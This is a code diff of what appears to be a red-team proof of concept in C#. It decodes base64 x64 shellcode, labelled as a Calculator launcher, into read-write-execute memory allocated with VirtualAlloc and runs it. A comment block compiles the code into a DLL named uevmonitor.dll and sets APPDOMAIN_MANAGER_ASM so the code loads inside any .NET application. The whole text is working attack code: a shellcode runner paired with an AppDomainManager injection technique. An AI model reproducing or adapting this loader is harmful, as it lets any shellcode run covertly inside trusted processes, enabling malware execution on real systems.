@@ -44,7 +44,7 @@ public class ClassExample
 	);          
 	public static bool Execute()
 	{
-
+	  // x64 Calc Shellcode Example
 	  byte[] installercode = System.Convert.FromBase64String("/EiD5PDowAAAAEFRQVBSUVZIMdJlSItSYEiLUhhIi1IgSItyUEgPt0pKTTHJSDHArDxhfAIsIEHByQ1BAcHi7VJBUUiLUiCLQjxIAdCLgIgAAABIhcB0Z0gB0FCLSBhEi0AgSQHQ41ZI/8lBizSISAHWTTHJSDHArEHByQ1BAcE44HXxTANMJAhFOdF12FhEi0AkSQHQZkGLDEhEi0AcSQHQQYsEiEgB0EFYQVheWVpBWEFZQVpIg+wgQVL/4FhBWVpIixLpV////11IugEAAAAAAAAASI2NAQEAAEG6MYtvh//Vu+AdKgpBuqaVvZ3/1UiDxCg8BnwKgPvgdQW7RxNyb2oAWUGJ2v/VY2FsYwA=");
 	  
 	  IntPtr funcAddr = VirtualAlloc(0, (UInt32)installercode.Length, 0x1000, 0x40);
@@ -59,6 +59,8 @@ public class ClassExample
 }     
 
 /*
+// uevmonitor.dll and path are _completely_ arbitrary here, so is the use of FileHistory.
+// This should work with any .NET app
 
 C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /target:library /out:uevmonitor.dll type.cs
 set APPDOMAIN_MANAGER_ASM=uevmonitor, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
